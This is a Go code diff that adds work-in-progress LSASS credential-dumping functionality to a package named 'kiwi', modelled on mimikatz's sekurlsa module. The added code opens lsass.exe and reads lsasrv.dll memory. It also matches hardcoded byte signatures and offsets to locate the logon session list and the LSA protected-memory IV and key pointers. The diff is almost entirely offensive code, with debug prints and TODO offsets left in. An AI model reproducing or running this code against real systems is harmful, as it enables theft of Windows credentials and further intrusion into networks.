@@ -3,6 +3,7 @@
 package kiwi
 
 import (
+	"bytes"
 	"fmt"
 	"reflect"
 	"sort"
@@ -13,6 +14,7 @@ import (
 	"github.com/pkg/errors"
 	"golang.org/x/sys/windows"
 
+	"project/internal/convert"
 	"project/internal/logger"
 	"project/internal/module/windows/api"
 	"project/internal/module/windows/privilege"
@@ -88,8 +90,6 @@ func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 	if wow64 {
 		return nil, errors.New("can't access x64 process")
 	}
-
-	// get lsass process handle
 	pid, err := kiwi.getLSASSProcessID()
 	if err != nil {
 		return nil, err
@@ -99,11 +99,17 @@ func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 		return nil, err
 	}
 	defer api.CloseHandle(pHandle)
-	kiwi.logf(logger.Debug, "process handle of lsass.exe is 0x%X", pHandle)
-	modules, err := kiwi.getVeryBasicModuleInfo(pHandle)
-
-	fmt.Println(modules)
-
+	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)
+	modules, err := kiwi.getLSASSBasicModuleInfo(pHandle)
+	if err != nil {
+		return nil, err
+	}
+	for _, module := range modules {
+		if module.name == "lsasrv.dll" {
+			_ = kiwi.searchMemory(pHandle, module.address, module.size)
+		}
+		// fmt.Println(module.name, module.address)
+	}
 	return nil, nil
 }
 
@@ -137,7 +143,7 @@ func (kiwi *Kiwi) getLSASSProcessID() (uint32, error) {
 		return 0, err
 	}
 	defer func() {
-		kiwi.logf(logger.Debug, "PID of lsass.exe is %d", kiwi.pid)
+		kiwi.logf(logger.Info, "PID of lsass.exe is %d", kiwi.pid)
 	}()
 	l := len(pid)
 	if l == 1 {
@@ -177,7 +183,7 @@ func (kiwi *Kiwi) getLSASSHandle(pid uint32) (windows.Handle, error) {
 type basicModuleInfo struct {
 	name    string
 	address uintptr
-	size    uint32
+	size    int
 }
 
 func (kiwi *Kiwi) getVeryBasicModuleInfo(pHandle windows.Handle) ([]*basicModuleInfo, error) {
@@ -249,14 +255,150 @@ func (kiwi *Kiwi) getVeryBasicModuleInfo(pHandle windows.Handle) ([]*basicModule
 		modules = append(modules, &basicModuleInfo{
 			name:    string(utf16.Decode(utf16Str)),
 			address: ldrEntry.DLLBase,
-			size:    ldrEntry.SizeOfImage,
+			size:    int(ldrEntry.SizeOfImage),
 		})
 	}
 	kiwi.log(logger.Debug, "loaded module count:", len(modules))
 	return modules, nil
 }
 
-// if finalName == "lsasrv.dll" {
-// // kiwi.searchMemory(pHandle, ldrEntry.DLLBase, int(ldrEntry.SizeOfImage))
-// }
-//
+func (kiwi *Kiwi) getLSASSBasicModuleInfo(pHandle windows.Handle) ([]*basicModuleInfo, error) {
+	kiwi.mu.Lock()
+	defer kiwi.mu.Unlock()
+	if len(kiwi.modules) != 0 {
+		return kiwi.modules, nil
+	}
+	var err error
+	kiwi.modules, err = kiwi.getVeryBasicModuleInfo(pHandle)
+	if err != nil {
+		return nil, err
+	}
+	kiwi.log(logger.Info, "load module information about lsass.exe successfully")
+	return kiwi.modules, nil
+}
+
+var (
+	win6xLogonSessionList = []byte{0x33, 0xFF, 0x41, 0x89, 0x37, 0x4C, 0x8B, 0xF3, 0x45, 0x85, 0xC0, 0x74}
+
+	win10LSAInitializeProtectedMemoryKey = []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8D,
+		0x45, 0xE0, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8D, 0x15} // 67, -89, 16
+)
+
+type bcryptHandleKey struct {
+	size       uint32
+	tag        uint32 // R U U U
+	hAlgorithm uintptr
+	key        uintptr // bcryptKey
+	unk0       uintptr
+}
+
+type bcryptKey81 struct {
+	size    uint32
+	tag     uint32 // K S S M
+	typ     uint32
+	unk0    uint32
+	unk1    uint32
+	unk2    uint32
+	unk3    uint32
+	unk4    uint32
+	unk5    uintptr // before, align in x64
+	unk6    uint32
+	unk7    uint32
+	unk8    uint32
+	unk9    uint32
+	hardKey hardKey
+}
+
+type hardKey struct {
+	cbSecret uint32
+	data     [4]byte // self append
+}
+
+func (kiwi *Kiwi) searchMemory(pHandle windows.Handle, address uintptr, length int) error {
+	memory := make([]byte, length)
+	_, err := api.ReadProcessMemory(pHandle, address, uintptr(unsafe.Pointer(&memory[0])), uintptr(length))
+	if err != nil {
+		return errors.WithMessage(err, "failed to search memory")
+	}
+
+	// https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0
+	// /mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
+
+	index := bytes.Index(memory, win6xLogonSessionList)
+	address1 := address + uintptr(index) + 23 // TODO 16 -> 23
+	// lsass address
+	var offset int32
+	_, err = api.ReadProcessMemory(pHandle, address1, uintptr(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
+	if err != nil {
+		return errors.WithMessage(err, "failed to search memory")
+	}
+	fmt.Printf("%X\n", address1)
+	fmt.Println(offset)
+	fmt.Println(convert.LEInt32ToBytes(offset))
+	fmt.Println()
+
+	genericPtr := address1 + 4 + uintptr(offset)
+
+	fmt.Printf("%X\n", genericPtr)
+
+	address1 = address + uintptr(index) - 4
+	_, err = api.ReadProcessMemory(pHandle, address1, uintptr(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
+	if err != nil {
+		return errors.WithMessage(err, "failed to search iv")
+	}
+	fmt.Printf("%X\n", address1)
+	fmt.Println(offset)
+	fmt.Println(convert.LEInt32ToBytes(offset))
+	fmt.Println()
+
+	genericPtr2 := address1 + 4 + uintptr(offset)
+	fmt.Printf("%X\n", genericPtr2)
+
+	// address1 += 4 + uintptr(offset64)
+
+	index = bytes.Index(memory, win10LSAInitializeProtectedMemoryKey)
+
+	// https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0/
+	// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
+
+	address2 := address + uintptr(index) + 67 // TODO off0
+	fmt.Printf("%X\n", address2)
+
+	var offset2 uint32
+	_, err = api.ReadProcessMemory(pHandle, address2, uintptr(unsafe.Pointer(&offset2)), unsafe.Sizeof(offset2))
+	if err != nil {
+		return errors.WithMessage(err, "failed to read iv")
+	}
+
+	address2 += 4 + uintptr(offset2)
+	fmt.Printf("%X\n", address2)
+
+	iv := make([]byte, 16)
+	_, err = api.ReadProcessMemory(pHandle, address2, uintptr(unsafe.Pointer(&iv[0])), uintptr(16))
+	if err != nil {
+		return errors.WithMessage(err, "failed to search iv")
+	}
+	fmt.Println(iv)
+
+	address3 := address + uintptr(index) - 89 // TODO off1
+	fmt.Printf("%X\n", address3)
+
+	var offset3 int32
+	_, err = api.ReadProcessMemory(pHandle, address3, uintptr(unsafe.Pointer(&offset3)), unsafe.Sizeof(offset3))
+	if err != nil {
+		return errors.WithMessage(err, "failed to search iv")
+	}
+	fmt.Println(convert.LEInt32ToBytes(offset3))
+
+	address3 += 4 + uintptr(offset3)
+	var pointer1 uintptr
+	_, err = api.ReadProcessMemory(pHandle, address3, uintptr(unsafe.Pointer(&pointer1)), unsafe.Sizeof(pointer1))
+	if err != nil {
+		return errors.WithMessage(err, "failed to search iv")
+	}
+	fmt.Printf("%X\n", pointer1)
+
+	return nil
+}
+
+// 33 ff 41 89 37 4c 8b f3 45 85 c0 74
